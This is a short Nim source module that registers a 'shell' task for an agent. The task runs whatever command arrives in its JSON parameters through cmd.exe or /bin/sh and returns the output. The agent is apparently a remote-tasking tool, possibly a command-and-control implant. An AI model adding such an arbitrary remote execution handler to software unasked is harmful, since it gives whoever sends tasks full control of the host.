import std/[osproc, os, json]
import ../types
import ./registry

proc shellExecute(taskId: string, params: JsonNode, state: AgentState,
                  send: SendMsg): TaskResult =
  let command = params{"command"}.getStr("")
  if command.len == 0:
    return TaskResult(output: "Error: command parameter missing",
                      status: "error", completed: true)
  try:
    when defined(windows):
      let (output, code) = execCmdEx(
        "cmd.exe /c " & command,
        options = {poStdErrToStdOut},
        workingDir = state.cwd,
      )
    else:
      let (output, code) = execCmdEx(
        "/bin/sh -c " & quoteShell(command),
        options = {poStdErrToStdOut},
        workingDir = state.cwd,
      )
    let status = if code == 0: "success" else: "error"
    return TaskResult(output: output, status: status, completed: true)
  except Exception as e:
    return TaskResult(output: "Error: " & e.msg, status: "error", completed: true)

proc initShell*() =
  register("shell", shellExecute)
